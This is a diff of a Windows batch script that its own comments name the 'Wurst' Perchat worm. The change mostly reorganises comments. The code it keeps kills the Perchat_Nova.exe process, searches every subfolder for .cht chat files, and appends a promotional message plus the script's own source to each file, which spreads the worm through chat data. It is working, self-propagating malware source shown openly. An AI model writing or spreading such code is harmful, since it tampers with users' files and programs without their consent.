@@ -1,4 +1,4 @@
-REM "Wurst" Perchat/Kolmitt worm
+REM "Wurst" Perchat worm
 @echo off
 REM Sets the command prompt title to Wurst.
 title Wurst
@@ -10,8 +10,10 @@ tskill Perchat_Nova.exe
 
 REM Recursively finds chat files starting from the directory where Wurst was executed.
 for /r %%i in (*.cht) do (
-	echo: >> %%i REM Adds new line to a chat file
-	echo this is wurst, a cool program -Wurst %date% >> %%i REM Message telling users to check it out.
+	REM Adds new line to a chat file
+	echo: >> %%i
+	REM Message telling users to check it out.
+	echo this is wurst, a cool program -Wurst %date% >> %%i
 	echo check it out! -Wurst %date% >> %%i
 	type %0 >> %%i REM Source code for the worm, %0 refers to the batch file
 	echo: >> %%i
